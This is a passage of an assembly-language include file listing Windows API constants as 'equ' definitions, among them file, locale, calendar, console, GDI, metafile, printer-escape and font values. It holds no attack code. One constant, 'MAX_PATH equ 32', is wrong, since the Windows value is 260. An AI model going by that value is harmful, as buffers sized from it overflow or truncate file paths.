S_SERDSH equ -11
S_SERDPT equ -12
S_SERDFQ equ -13
S_SERDDR equ -14
S_SERDSR equ -15
S_SERDST equ -16
NMPWAIT_WAIT_FOREVER equ 0FFFFh
NMPWAIT_NOWAIT equ 1h
NMPWAIT_USE_DEFAULT_WAIT equ 0h
FS_CASE_IS_PRESERVED equ FILE_CASE_PRESERVED_NAMES
FS_CASE_SENSITIVE equ FILE_CASE_SENSITIVE_SEARCH
FS_UNICODE_STORED_ON_DISK equ FILE_UNICODE_ON_DISK
FS_PERSISTENT_ACLS equ FILE_PERSISTENT_ACLS
SECTION_QUERY equ 1h
SECTION_MAP_WRITE equ 2h
SECTION_MAP_READ equ 4h
SECTION_MAP_EXECUTE equ 8h
SECTION_EXTEND_SIZE equ 10h
SECTION_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|SECTION_QUERY|SECTION_MAP_WRITE|SECTION_MAP_READ|SECTION_MAP_EXECUTE|SECTION_EXTEND_SIZE
FILE_MAP_COPY equ SECTION_QUERY
FILE_MAP_WRITE equ SECTION_MAP_WRITE
FILE_MAP_READ equ SECTION_MAP_READ
FILE_MAP_ALL_ACCESS equ SECTION_ALL_ACCESS
OF_READ equ 0h
OF_WRITE equ 1h
OF_READWRITE equ 2h
OF_SHARE_COMPAT equ 0h
OF_SHARE_EXCLUSIVE equ 10h
OF_SHARE_DENY_WRITE equ 20h
OF_SHARE_DENY_READ equ 30h
OF_SHARE_DENY_NONE equ 40h
OF_PARSE equ 100h
OF_DELETE equ 200h
OF_VERIFY equ 400h
OF_CANCEL equ 800h
OF_CREATE equ 1000h
OF_PROMPT equ 2000h
OF_EXIST equ 4000h
OF_REOPEN equ 8000h
OFS_MAXPATHNAME equ 128
DONT_RESOLVE_DLL_REFERENCES equ 1h
TC_NORMAL equ 0
TC_HARDERR equ 1
TC_GP_TRAP equ 2
TC_SIGNAL equ 3
MAX_LEADBYTES equ 12
MB_PRECOMPOSED equ 1h
MB_COMPOSITE equ 2h
MB_USEGLYPHCHARS equ 4h
WC_DEFAULTCHECK equ 100h
WC_COMPOSITECHECK equ 200h
WC_DISCARDNS equ 10h
WC_SEPCHARS equ 20h
WC_DEFAULTCHAR equ 40h
CT_CTYPE1 equ 1h
CT_CTYPE2 equ 2h
CT_CTYPE3 equ 4h
C1_UPPER equ 1h
C1_LOWER equ 2h
C1_DIGIT equ 4h
C1_SPACE equ 8h
C1_PUNCT equ 10h
C1_CNTRL equ 20h
C1_BLANK equ 40h
C1_XDIGIT equ 80h
C1_ALPHA equ 100h
C2_LEFTTORIGHT equ 1h
C2_RIGHTTOLEFT equ 2h
C2_EUROPENUMBER equ 3h
C2_EUROPESEPARATOR equ 4h
C2_EUROPETERMINATOR equ 5h
C2_ARABICNUMBER equ 6h
C2_COMMONSEPARATOR equ 7h
C2_BLOCKSEPARATOR equ 8h
C2_SEGMENTSEPARATOR equ 9h
C2_WHITESPACE equ 0Ah
C2_OTHERNEUTRAL equ 0Bh
C2_NOTAPPLICABLE equ 0h
C3_NONSPACING equ 1h
C3_DIACRITIC equ 2h
C3_VOWELMARK equ 4h
C3_SYMBOL equ 8h
C3_NOTAPPLICABLE equ 0h
NORM_IGNORECASE equ 1h
NORM_IGNORENONSPACE equ 2h
NORM_IGNORESYMBOLS equ 4h
MAP_FOLDCZONE equ 10h
MAP_PRECOMPOSED equ 20h
MAP_COMPOSITE equ 40h
MAP_FOLDDIGITS equ 80h
LCMAP_LOWERCASE equ 100h
LCMAP_UPPERCASE equ 200h
LCMAP_SORTKEY equ 400h
LCMAP_BYTEREV equ 800h
SORT_STRINGSORT equ 1000h
CP_ACP equ 0
CP_OEMCP equ 1
CTRY_DEFAULT equ 0
CTRY_AUSTRALIA equ 61
CTRY_AUSTRIA equ 43
CTRY_BELGIUM equ 32
CTRY_BRAZIL equ 55
CTRY_CANADA equ 2
CTRY_DENMARK equ 45
CTRY_FINLAND equ 358
CTRY_FRANCE equ 33
CTRY_GERMANY equ 49
CTRY_ICELAND equ 354
CTRY_IRELAND equ 353
CTRY_ITALY equ 39
CTRY_JAPAN equ 81
CTRY_MEXICO equ 52
CTRY_NETHERLANDS equ 31
CTRY_NEW_ZEALAND equ 64
CTRY_NORWAY equ 47
CTRY_PORTUGAL equ 351
CTRY_PRCHINA equ 86
CTRY_SOUTH_KOREA equ 82
CTRY_SPAIN equ 34
CTRY_SWEDEN equ 46
CTRY_SWITZERLAND equ 41
CTRY_TAIWAN equ 886
CTRY_UNITED_KINGDOM equ 44
CTRY_UNITED_STATES equ 1
LOCALE_NOUSEROVERRIDE equ 80000000h
LOCALE_USER_DEFAULT equ 0000h
LOCALE_ILANGUAGE equ 1h
LOCALE_SLANGUAGE equ 2h
LOCALE_SENGLANGUAGE equ 1001h
LOCALE_SABBREVLANGNAME equ 3h
LOCALE_SNATIVELANGNAME equ 4h
LOCALE_ICOUNTRY equ 5h
LOCALE_SCOUNTRY equ 6h
LOCALE_SENGCOUNTRY equ 1002h
LOCALE_SABBREVCTRYNAME equ 7h
LOCALE_SNATIVECTRYNAME equ 8h
LOCALE_IDEFAULTLANGUAGE equ 9h
LOCALE_IDEFAULTCOUNTRY equ 0Ah
LOCALE_IDEFAULTCODEPAGE equ 0Bh
LOCALE_SLIST equ 0Ch
LOCALE_IMEASURE equ 0Dh
LOCALE_SDECIMAL equ 0Eh
LOCALE_STHOUSAND equ 0Fh
LOCALE_SGROUPING equ 10h
LOCALE_IDIGITS equ 11h
LOCALE_ILZERO equ 12h
LOCALE_SNATIVEDIGITS equ 13h
LOCALE_SCURRENCY equ 14h
LOCALE_SINTLSYMBOL equ 15h
LOCALE_SMONDECIMALSEP equ 16h
LOCALE_SMONTHOUSANDSEP equ 17h
LOCALE_SMONGROUPING equ 18h
LOCALE_ICURRDIGITS equ 19h
LOCALE_IINTLCURRDIGITS equ 1Ah
LOCALE_ICURRENCY equ 1Bh
LOCALE_INEGCURR equ 1Ch
LOCALE_SDATE equ 1Dh
LOCALE_STIME equ 1Eh
LOCALE_SSHORTDATE equ 1Fh
LOCALE_SLONGDATE equ 20h
LOCALE_STIMEFORMAT equ 1003h
LOCALE_IDATE equ 21h
LOCALE_ILDATE equ 22h
LOCALE_ITIME equ 23h
LOCALE_ICENTURY equ 24h
LOCALE_ITLZERO equ 25h
LOCALE_IDAYLZERO equ 26h
LOCALE_IMONLZERO equ 27h
LOCALE_S1159 equ 28h
LOCALE_S2359 equ 29h
LOCALE_SDAYNAME1 equ 2Ah
LOCALE_SDAYNAME2 equ 2Bh
LOCALE_SDAYNAME3 equ 2Ch
LOCALE_SDAYNAME4 equ 2Dh
LOCALE_SDAYNAME5 equ 2Eh
LOCALE_SDAYNAME6 equ 2Fh
LOCALE_SDAYNAME7 equ 30h
LOCALE_SABBREVDAYNAME1 equ 31h
LOCALE_SABBREVDAYNAME2 equ 32h
LOCALE_SABBREVDAYNAME3 equ 33h
LOCALE_SABBREVDAYNAME4 equ 34h
LOCALE_SABBREVDAYNAME5 equ 35h
LOCALE_SABBREVDAYNAME6 equ 36h
LOCALE_SABBREVDAYNAME7 equ 37h
LOCALE_SMONTHNAME1 equ 38h
LOCALE_SMONTHNAME2 equ 39h
LOCALE_SMONTHNAME3 equ 3Ah
LOCALE_SMONTHNAME4 equ 3Bh
LOCALE_SMONTHNAME5 equ 3Ch
LOCALE_SMONTHNAME6 equ 3Dh
LOCALE_SMONTHNAME7 equ 3Eh
LOCALE_SMONTHNAME8 equ 3Fh
LOCALE_SMONTHNAME9 equ 40h
LOCALE_SMONTHNAME10 equ 41h
LOCALE_SMONTHNAME11 equ 42h
LOCALE_SMONTHNAME12 equ 43h
LOCALE_SABBREVMONTHNAME1 equ 44h
LOCALE_SABBREVMONTHNAME2 equ 45h
LOCALE_SABBREVMONTHNAME3 equ 46h
LOCALE_SABBREVMONTHNAME4 equ 47h
LOCALE_SABBREVMONTHNAME5 equ 48h
LOCALE_SABBREVMONTHNAME6 equ 49h
LOCALE_SABBREVMONTHNAME7 equ 4Ah
LOCALE_SABBREVMONTHNAME8 equ 4Bh
LOCALE_SABBREVMONTHNAME9 equ 4Ch
LOCALE_SABBREVMONTHNAME10 equ 4Dh
LOCALE_SABBREVMONTHNAME11 equ 4Eh
LOCALE_SABBREVMONTHNAME12 equ 4Fh
LOCALE_SABBREVMONTHNAME13 equ 100Fh
LOCALE_SPOSITIVESIGN equ 50h
LOCALE_SNEGATIVESIGN equ 51h
LOCALE_IPOSSIGNPOSN equ 52h
LOCALE_INEGSIGNPOSN equ 53h
LOCALE_IPOSSYMPRECEDES equ 54h
LOCALE_IPOSSEPBYSPACE equ 55h
LOCALE_INEGSYMPRECEDES equ 56h
LOCALE_INEGSEPBYSPACE equ 57h
TIME_NOMINUTESORSECONDS equ 1h
TIME_NOSECONDS equ 2h
TIME_NOTIMEMARKER equ 4h
TIME_FORCE24HOURFORMAT equ 8h
DATE_SHORTDATE equ 1h
DATE_LONGDATE equ 2h
TF_FORCEDRIVE equ 80h
LOCKFILE_FAIL_IMMEDIATELY equ 1h
LOCKFILE_EXCLUSIVE_LOCK equ 2h
LNOTIFY_OUTOFMEM equ 0
LNOTIFY_MOVE equ 1
LNOTIFY_DISCARD equ 2
SLE_ERROR equ 1h
SLE_MINORERROR equ 2h
SLE_WARNING equ 3h
SEM_FAILCRITICALERRORS equ 1h
SEM_NOGPFAULTERRORBOX equ 2h
SEM_NOOPENFILEERRORBOX equ 8000h
RT_CURSOR equ 1
RT_BITMAP equ 2
RT_ICON equ 3
RT_MENU equ 4
RT_DIALOG equ 5
RT_STRING equ 6
RT_FONTDIR equ 7
RT_FONT equ 8
RT_ACCELERATOR equ 9
RT_RCDATA equ 10
DFC_CAPTION equ 1
DFC_MENU equ 2
DFC_SCROLL equ 3
DFC_BUTTON equ 4
DFCS_CAPTIONCLOSE equ 0000h
DFCS_CAPTIONMIN equ 0001h
DFCS_CAPTIONMAX equ 0002h
DFCS_CAPTIONRESTORE equ 0003h
DFCS_CAPTIONHELP equ 0004h
DFCS_MENUARROW equ 0000h
DFCS_MENUCHECK equ 0001h
DFCS_MENUBULLET equ 0002h
DFCS_MENUARROWRIGHT equ 0004h
DFCS_SCROLLUP equ 0000h
DFCS_SCROLLDOWN equ 0001h
DFCS_SCROLLLEFT equ 0002h
DFCS_SCROLLRIGHT equ 0003h
DFCS_SCROLLCOMBOBOX equ 0005h
DFCS_SCROLLSIZEGRIP equ 0008h
DFCS_SCROLLSIZEGRIPRIGHT equ 0010h
DFCS_BUTTONCHECK equ 0000h
DFCS_BUTTONRADIOIMAGE equ 0001h
DFCS_BUTTONRADIOMASK equ 0002h
DFCS_BUTTONRADIO equ 0004h
DFCS_BUTTON3STATE equ 0008h
DFCS_BUTTONPUSH equ 0010h
DFCS_INACTIVE equ 0100h
DFCS_PUSHED equ 0200h
DFCS_CHECKED equ 0400h
DFCS_ADJUSTRECT equ 2000h
DFCS_FLAT equ 4000h
DFCS_MONO equ 8000h
DDD_RAW_TARGET_PATH equ 1h
DDD_REMOVE_DEFINITION equ 2h
DDD_EXACT_MATCH_ON_REMOVE equ 4h
MAX_PATH equ 32
MOVEFILE_REPLACE_EXISTING equ 1h
MOVEFILE_COPY_ALLOWED equ 2h
MOVEFILE_DELAY_UNTIL_REBOOT equ 4h
TokenUser equ 1
TokenGroups equ 2
TokenPrivileges equ 3
TokenOwner equ 4
TokenPrimaryGroup equ 5
TokenDefaultDacl equ 6
TokenSource equ 7
TokenType equ 8
TokenImpersonationLevel equ 9
TokenStatistics equ 10
GET_TAPE_MEDIA_INFORMATION equ 0
GET_TAPE_DRIVE_INFORMATION equ 1
SET_TAPE_MEDIA_INFORMATION equ 0
SET_TAPE_DRIVE_INFORMATION equ 1
FORMAT_MESSAGE_ALLOCATE_BUFFER equ 100h
FORMAT_MESSAGE_IGNORE_INSERTS equ 200h
FORMAT_MESSAGE_FROM_STRING equ 400h
FORMAT_MESSAGE_FROM_HMODULE equ 800h
FORMAT_MESSAGE_FROM_SYSTEM equ 1000h
FORMAT_MESSAGE_ARGUMENT_ARRAY equ 2000h
FORMAT_MESSAGE_MAX_WIDTH_MASK equ 0FFh
TLS_OUT_OF_INDEXES equ 0FFFFh
BACKUP_DATA equ 1h
BACKUP_EA_DATA equ 2h
BACKUP_SECURITY_DATA equ 3h
BACKUP_ALTERNATE_DATA equ 4h
BACKUP_LINK equ 5h
STREAM_MODIFIED_WHEN_READ equ 1h
STREAM_CONTAINS_SECURITY equ 2h
STARTF_USESHOWWINDOW equ 1h
STARTF_USESIZE equ 2h
STARTF_USEPOSITION equ 4h
STARTF_USECOUNTCHARS equ 8h
STARTF_USEFILLATTRIBUTE equ 10h
STARTF_RUNFULLSCREEN equ 20h
STARTF_FORCEONFEEDBACK equ 40h
STARTF_FORCEOFFFEEDBACK equ 80h
STARTF_USESTDHANDLES equ 100h
SHUTDOWN_NORETRY equ 1h
MAX_DEFAULTCHAR equ 2
CAL_ICALINTVALUE equ 1h
CAL_SCALNAME equ 2h
CAL_IYEAROFFSETRANGE equ 3h
CAL_SERASTRING equ 4h
CAL_SSHORTDATE equ 5h
CAL_SLONGDATE equ 6h
CAL_SDAYNAME1 equ 7h
CAL_SDAYNAME2 equ 8h
CAL_SDAYNAME3 equ 9h
CAL_SDAYNAME4 equ 0Ah
CAL_SDAYNAME5 equ 0Bh
CAL_SDAYNAME6 equ 0Ch
CAL_SDAYNAME7 equ 0Dh
CAL_SABBREVDAYNAME1 equ 0Eh
CAL_SABBREVDAYNAME2 equ 0Fh
CAL_SABBREVDAYNAME3 equ 10h
CAL_SABBREVDAYNAME4 equ 11h
CAL_SABBREVDAYNAME5 equ 12h
CAL_SABBREVDAYNAME6 equ 13h
CAL_SABBREVDAYNAME7 equ 14h
CAL_SMONTHNAME1 equ 15h
CAL_SMONTHNAME2 equ 16h
CAL_SMONTHNAME3 equ 17h
CAL_SMONTHNAME4 equ 18h
CAL_SMONTHNAME5 equ 19h
CAL_SMONTHNAME6 equ 1Ah
CAL_SMONTHNAME7 equ 1Bh
CAL_SMONTHNAME8 equ 1Ch
CAL_SMONTHNAME9 equ 1Dh
CAL_SMONTHNAME10 equ 1Eh
CAL_SMONTHNAME11 equ 1Fh
CAL_SMONTHNAME12 equ 20h
CAL_SMONTHNAME13 equ 21h
CAL_SABBREVMONTHNAME1 equ 22h
CAL_SABBREVMONTHNAME2 equ 23h
CAL_SABBREVMONTHNAME3 equ 24h
CAL_SABBREVMONTHNAME4 equ 25h
CAL_SABBREVMONTHNAME5 equ 26h
CAL_SABBREVMONTHNAME6 equ 27h
CAL_SABBREVMONTHNAME7 equ 28h
CAL_SABBREVMONTHNAME8 equ 29h
CAL_SABBREVMONTHNAME9 equ 2Ah
CAL_SABBREVMONTHNAME10 equ 2Bh
CAL_SABBREVMONTHNAME11 equ 2Ch
CAL_SABBREVMONTHNAME12 equ 2Dh
CAL_SABBREVMONTHNAME13 equ 2Eh
ENUM_ALL_CALENDARS equ 0FFFFh
CAL_GREGORIAN equ 1
CAL_GREGORIAN_US equ 2
CAL_JAPAN equ 3
CAL_TAIWAN equ 4
CAL_KOREA equ 5
RIGHT_ALT_PRESSED equ 1h
LEFT_ALT_PRESSED equ 2h
RIGHT_CTRL_PRESSED equ 4h
LEFT_CTRL_PRESSED equ 8h
SHIFT_PRESSED equ 10h
NUMLOCK_ON equ 20h
SCROLLLOCK_ON equ 40h
CAPSLOCK_ON equ 80h
ENHANCED_KEY equ 100h
FROM_LEFT_1ST_BUTTON_PRESSED equ 1h
RIGHTMOST_BUTTON_PRESSED equ 2h
FROM_LEFT_2ND_BUTTON_PRESSED equ 4h
FROM_LEFT_3RD_BUTTON_PRESSED equ 8h
FROM_LEFT_4TH_BUTTON_PRESSED equ 10h
MOUSE_MOVED equ 1h
DOUBLE_CLICK equ 2h
KEY_EVENT equ 1h
mouse_eventC equ 2h
WINDOW_BUFFER_SIZE_EVENT equ 4h
MENU_EVENT equ 8h
FOCUS_EVENT equ 10h
FOREGROUND_BLUE equ 1h
FOREGROUND_GREEN equ 2h
FOREGROUND_RED equ 4h
FOREGROUND_INTENSITY equ 8h
BACKGROUND_BLUE equ 10h
BACKGROUND_GREEN equ 20h
BACKGROUND_RED equ 40h
BACKGROUND_INTENSITY equ 80h
CTRL_C_EVENT equ 0
CTRL_BREAK_EVENT equ 1
CTRL_CLOSE_EVENT equ 2
CTRL_LOGOFF_EVENT equ 5
CTRL_SHUTDOWN_EVENT equ 6
ENABLE_PROCESSED_INPUT equ 1h
ENABLE_LINE_INPUT equ 2h
ENABLE_ECHO_INPUT equ 4h
ENABLE_WINDOW_INPUT equ 8h
ENABLE_MOUSE_INPUT equ 10h
ENABLE_PROCESSED_OUTPUT equ 1h
ENABLE_WRAP_AT_EOL_OUTPUT equ 2h
CONSOLE_TEXTMODE_BUFFER equ 1
R2_BLACK equ 1
R2_NOTMERGEPEN equ 2
R2_MASKNOTPEN equ 3
R2_NOTCOPYPEN equ 4
R2_MASKPENNOT equ 5
R2_NOT equ 6
R2_XORPEN equ 7
R2_NOTMASKPEN equ 8
R2_MASKPEN equ 9
R2_NOTXORPEN equ 10
R2_NOP equ 11
R2_MERGENOTPEN equ 12
R2_COPYPEN equ 13
R2_MERGEPENNOT equ 14
R2_MERGEPEN equ 15
R2_WHITE equ 16
R2_LAST equ 16
SRCCOPY equ 0CC0020h
SRCPAINT equ 0EE0086h
SRCAND equ 8800C6h
SRCINVERT equ 660046h
SRCERASE equ 440328h
NOTSRCCOPY equ 330008h
NOTSRCERASE equ 1100A6h
MERGECOPY equ 0C000CAh
MERGEPAINT equ 0BB0226h
PATCOPY equ 0F00021h
PATPAINT equ 0FB0A09h
PATINVERT equ 5A0049h
DSTINVERT equ 550009h
BLACKNESS equ 42h
WHITENESS equ 0FF0062h
GDI_ERROR equ 0FFFFh
HGDI_ERROR equ 0FFFFh
ERRORAPI equ 0
NULLREGION equ 1
SIMPLEREGION equ 2
COMPLEXREGION equ 3
RGN_AND equ 1
RGN_OR equ 2
RGN_XOR equ 3
RGN_DIFF equ 4
RGN_COPY equ 5
RGN_MIN equ RGN_AND
RGN_MAX equ RGN_COPY
BLACKONWHITE equ 1
WHITEONBLACK equ 2
COLORONCOLOR equ 3
HALFTONE equ 4
MAXSTRETCHBLTMODE equ 4
ALTERNATE equ 1
WINDING equ 2
POLYFILL_LAST equ 2
TA_NOUPDATECP equ 0
TA_UPDATECP equ 1
TA_LEFT equ 0
TA_RIGHT equ 2
TA_CENTER equ 6
TA_TOP equ 0
TA_BOTTOM equ 8
TA_BASELINE equ 24
TA_MASK equ TA_BASELINE+TA_CENTER+TA_UPDATECP
VTA_BASELINE equ TA_BASELINE
VTA_LEFT equ TA_BOTTOM
VTA_RIGHT equ TA_TOP
VTA_CENTER equ TA_CENTER
VTA_BOTTOM equ TA_RIGHT
VTA_TOP equ TA_LEFT
ETO_GRAYED equ 1
ETO_OPAQUE equ 2
ETO_CLIPPED equ 4
ASPECT_FILTERING equ 1h
DCB_RESET equ 1h
DCB_ACCUMULATE equ 2h
DCB_DIRTY equ DCB_ACCUMULATE
DCB_SET equ DCB_RESET|DCB_ACCUMULATE
DCB_ENABLE equ 4h
DCB_DISABLE equ 8h
META_SETBKCOLOR equ 201h
META_SETBKMODE equ 102h
META_SETMAPMODE equ 103h
META_SETROP2 equ 104h
META_SETRELABS equ 105h
META_SETPOLYFILLMODE equ 106h
META_SETSTRETCHBLTMODE equ 107h
META_SETTEXTCHAREXTRA equ 108h
META_SETTEXTCOLOR equ 209h
META_SETTEXTJUSTIFICATION equ 20Ah
META_SETWINDOWORG equ 20Bh
META_SETWINDOWEXT equ 20Ch
META_SETVIEWPORTORG equ 20Dh
META_SETVIEWPORTEXT equ 20Eh
META_OFFSETWINDOWORG equ 20Fh
META_SCALEWINDOWEXT equ 410h
META_OFFSETVIEWPORTORG equ 211h
META_SCALEVIEWPORTEXT equ 412h
META_LINETO equ 213h
META_MOVETO equ 214h
META_EXCLUDECLIPRECT equ 415h
META_INTERSECTCLIPRECT equ 416h
META_ARC equ 817h
META_ELLIPSE equ 418h
META_FLOODFILL equ 419h
META_PIE equ 81Ah
META_RECTANGLE equ 41Bh
META_ROUNDRECT equ 61Ch
META_PATBLT equ 61Dh
META_SAVEDC equ 1Eh
META_SETPIXEL equ 41Fh
META_OFFSETCLIPRGN equ 220h
META_TEXTOUT equ 521h
META_BITBLT equ 922h
META_STRETCHBLT equ 0B23h
META_POLYGON equ 324h
META_POLYLINE equ 325h
META_ESCAPE equ 626h
META_RESTOREDC equ 127h
META_FILLREGION equ 228h
META_FRAMEREGION equ 429h
META_INVERTREGION equ 12Ah
META_PAINTREGION equ 12Bh
META_SELECTCLIPREGION equ 12Ch
META_SELECTOBJECT equ 12Dh
META_SETTEXTALIGN equ 12Eh
META_CHORD equ 830h
META_SETMAPPERFLAGS equ 231h
META_EXTTEXTOUT equ 0A32h
META_SETDIBTODEV equ 0D33h
META_SELECTPALETTE equ 234h
META_REALIZEPALETTE equ 35h
META_ANIMATEPALETTE equ 436h
META_SETPALENTRIES equ 37h
META_POLYPOLYGON equ 538h
META_RESIZEPALETTE equ 139h
META_DIBBITBLT equ 940h
META_DIBSTRETCHBLT equ 0B41h
META_DIBCREATEPATTERNBRUSH equ 142h
META_STRETCHDIB equ 0F43h
META_EXTFLOODFILL equ 548h
META_DELETEOBJECT equ 1F0h
META_CREATEPALETTE equ 0F7h
META_CREATEPATTERNBRUSH equ 1F9h
META_CREATEPENINDIRECT equ 2FAh
META_CREATEFONTINDIRECT equ 2FBh
META_CREATEBRUSHINDIRECT equ 2FCh
META_CREATEREGION equ 6FFh
NEWFRAME equ 1
AbortDocC equ 2
NEXTBAND equ 3
SETCOLORTABLE equ 4
GETCOLORTABLE equ 5
FLUSHOUTPUT equ 6
DRAFTMODE equ 7
QUERYESCSUPPORT equ 8
SETABORTPROC equ 9
StartDocC equ 10
EndDocC equ 11
GETPHYSPAGESIZE equ 12
GETPRINTINGOFFSET equ 13
GETSCALINGFACTOR equ 14
MFCOMMENT equ 15
GETPENWIDTH equ 16
SETCOPYCOUNT equ 17
SELECTPAPERSOURCE equ 18
DEVICEDATA equ 19
PASSTHROUGH equ 19
GETTECHNOLGY equ 20
GETTECHNOLOGY equ 20
SETLINECAP equ 21
SETLINEJOIN equ 22
SetMiterLimitC equ 23
BANDINFO equ 24
DRAWPATTERNRECT equ 25
GETVECTORPENSIZE equ 26
GETVECTORBRUSHSIZE equ 27
ENABLEDUPLEX equ 28
GETSETPAPERBINS equ 29
GETSETPRINTORIENT equ 30
ENUMPAPERBINS equ 31
SETDIBSCALING equ 32
EPSPRINTING equ 33
ENUMPAPERMETRICS equ 34
GETSETPAPERMETRICS equ 35
POSTSCRIPT_DATA equ 37
POSTSCRIPT_IGNORE equ 38
MOUSETRAILS equ 39
GETDEVICEUNITS equ 42
GETEXTENDEDTEXTMETRICS equ 256
GETEXTENTTABLE equ 257
GETPAIRKERNTABLE equ 258
GETTRACKKERNTABLE equ 259
ExtTextOutC equ 512
GETFACENAME equ 513
DOWNLOADFACE equ 514
ENABLERELATIVEWIDTHS equ 768
ENABLEPAIRKERNING equ 769
SETKERNTRACK equ 770
SETALLJUSTVALUES equ 771
SETCHARSET equ 772
StretchBltC equ 2048
GETSETSCREENPARAMS equ 3072
BEGIN_PATH equ 4096
CLIP_TO_PATH equ 4097
END_PATH equ 4098
EXT_DEVICE_CAPS equ 4099
RESTORE_CTM equ 4100
SAVE_CTM equ 4101
SET_ARC_DIRECTION equ 4102
SET_BACKGROUND_COLOR equ 4103
SET_POLY_MODE equ 4104
SET_SCREEN_ANGLE equ 4105
SET_SPREAD equ 4106
TRANSFORM_CTM equ 4107
SET_CLIP_BOX equ 4108
SET_BOUNDS equ 4109
SET_MIRROR_MODE equ 4110
OPENCHANNEL equ 4110
DOWNLOADHEADER equ 4111
CLOSECHANNEL equ 4112
POSTSCRIPT_PASSTHROUGH equ 4115
ENCAPSULATED_POSTSCRIPT equ 4116
SP_NOTREPORTED equ 4000h
SP_ERROR equ -1
SP_APPABORT equ -2
SP_USERABORT equ -3
SP_OUTOFDISK equ -4
SP_OUTOFMEMORY equ -5
PR_JOBSTATUS equ 0h
OBJ_PEN equ 1
OBJ_BRUSH equ 2
OBJ_DC equ 3
OBJ_METADC equ 4
OBJ_PAL equ 5
OBJ_FONT equ 6
OBJ_BITMAP equ 7
OBJ_REGION equ 8
OBJ_METAFILE equ 9
OBJ_MEMDC equ 10
OBJ_EXTPEN equ 11
OBJ_ENHMETADC equ 12
OBJ_ENHMETAFILE equ 13
MWT_IDENTITY equ 1
MWT_LEFTMULTIPLY equ 2
MWT_RIGHTMULTIPLY equ 3
MWT_MIN equ MWT_IDENTITY
MWT_MAX equ MWT_RIGHTMULTIPLY
BI_RGB equ 0
BI_RLE8 equ 1
BI_RLE4 equ 2
BI_bitfields equ 3
NTM_REGULAR equ 40h
NTM_BOLD equ 20h
NTM_ITALIC equ 1h
TMPF_FIXED_PITCH equ 1h
TMPF_VECTOR equ 2h
TMPF_DEVICE equ 8h
TMPF_TRUETYPE equ 4h
LF_FACESIZE equ 32
LF_FULLFACESIZE equ 64
OUT_DEFAULT_PRECIS equ 0
OUT_STRING_PRECIS equ 1
OUT_CHARACTER_PRECIS equ 2
OUT_STROKE_PRECIS equ 3
OUT_TT_PRECIS equ 4
OUT_DEVICE_PRECIS equ 5
OUT_RASTER_PRECIS equ 6
OUT_TT_ONLY_PRECIS equ 7
OUT_OUTLINE_PRECIS equ 8
CLIP_DEFAULT_PRECIS equ 0
CLIP_CHARACTER_PRECIS equ 1
CLIP_STROKE_PRECIS equ 2
CLIP_MASK equ 0Fh
CLIP_LH_ANGLES equ 16
CLIP_TT_ALWAYS equ 32
CLIP_EMBEDDED equ 128
DEFAULT_QUALITY equ 0
DRAFT_QUALITY equ 1
PROOF_QUALITY equ 2
DEFAULT_PITCH equ 0
FIXED_PITCH equ 1
VARIABLE_PITCH equ 2
ANSI_CHARSET equ 0
DEFAULT_CHARSET equ 1
SYMBOL_CHARSET equ 2
SHIFTJIS_CHARSET equ 128
HANGEUL_CHARSET equ 129
CHINESEBIG5_CHARSET equ 136
OEM_CHARSET equ 255
FF_DONTCARE equ 0
FF_ROMAN equ 16
FF_SWISS equ 32
FF_MODERN equ 48
FF_SCRIPT equ 64
FF_DECORATIVE equ 80
FW_DONTCARE equ 0
FW_THIN equ 100
FW_EXTRALIGHT equ 200
FW_LIGHT equ 300
FW_NORMAL equ 400
FW_MEDIUM equ 500
FW_SEMIBOLD equ 600
FW_BOLD equ 700
FW_EXTRABOLD equ 800
FW_HEAVY equ 900
FW_ULTRALIGHT equ FW_EXTRALIGHT
FW_REGULAR equ FW_NORMAL
FW_DEMIBOLD equ FW_SEMIBOLD
FW_ULTRABOLD equ FW_EXTRABOLD
FW_BLACK equ FW_HEAVY
PANOSE_COUNT equ 10
PAN_FAMILYTYPE_INDEX equ 0
PAN_SERIFSTYLE_INDEX equ 1
PAN_WEIGHT_INDEX equ 2
PAN_PROPORTION_INDEX equ 3
PAN_CONTRAST_INDEX equ 4
PAN_STROKEVARIATION_INDEX equ 5
PAN_ARMSTYLE_INDEX equ 6
PAN_LETTERFORM_INDEX equ 7
PAN_MIDLINE_INDEX equ 8
PAN_XHEIGHT_INDEX equ 9
PAN_CULTURE_LATIN equ 0
PAN_ANY equ 0
PAN_NO_FIT equ 1
PAN_FAMILY_TEXT_DISPLAY equ 2
PAN_FAMILY_SCRIPT equ 3
PAN_FAMILY_DECORATIVE equ 4
PAN_FAMILY_PICTORIAL equ 5
PAN_SERIF_COVE equ 2
PAN_SERIF_OBTUSE_COVE equ 3
PAN_SERIF_SQUARE_COVE equ 4
PAN_SERIF_OBTUSE_SQUARE_COVE equ 5
PAN_SERIF_SQUARE equ 6
PAN_SERIF_THIN equ 7
PAN_SERIF_BONE equ 8
PAN_SERIF_EXAGGERATED equ 9
PAN_SERIF_TRIANGLE equ 10
PAN_SERIF_NORMAL_SANS equ 11
PAN_SERIF_OBTUSE_SANS equ 12
PAN_SERIF_PERP_SANS equ 13
PAN_SERIF_FLARED equ 14
PAN_SERIF_ROUNDED equ 15
PAN_WEIGHT_VERY_LIGHT equ 2
PAN_WEIGHT_LIGHT equ 3
PAN_WEIGHT_THIN equ 4
PAN_WEIGHT_BOOK equ 5
PAN_WEIGHT_MEDIUM equ 6
PAN_WEIGHT_DEMI equ 7
PAN_WEIGHT_BOLD equ 8
PAN_WEIGHT_HEAVY equ 9
PAN_WEIGHT_BLACK equ 10
PAN_WEIGHT_NORD equ 11
PAN_PROP_OLD_STYLE equ 2
PAN_PROP_MODERN equ 3
PAN_PROP_EVEN_WIDTH equ 4
PAN_PROP_EXPANDED equ 5
PAN_PROP_CONDENSED equ 6
PAN_PROP_VERY_EXPANDED equ 7
PAN_PROP_VERY_CONDENSED equ 8
PAN_PROP_MONOSPACED equ 9
PAN_CONTRAST_NONE equ 2
PAN_CONTRAST_VERY_LOW equ 3
PAN_CONTRAST_LOW equ 4
PAN_CONTRAST_MEDIUM_LOW equ 5
PAN_CONTRAST_MEDIUM equ 6
PAN_CONTRAST_MEDIUM_HIGH equ 7
PAN_CONTRAST_HIGH equ 8
PAN_CONTRAST_VERY_HIGH equ 9
PAN_STROKE_GRADUAL_DIAG equ 2
PAN_STROKE_GRADUAL_TRAN equ 3
PAN_STROKE_GRADUAL_VERT equ 4
PAN_STROKE_GRADUAL_HORZ equ 5
PAN_STROKE_RAPID_VERT equ 6
PAN_STROKE_RAPID_HORZ equ 7
PAN_STROKE_INSTANT_VERT equ 8
PAN_STRAIGHT_ARMS_HORZ equ 2
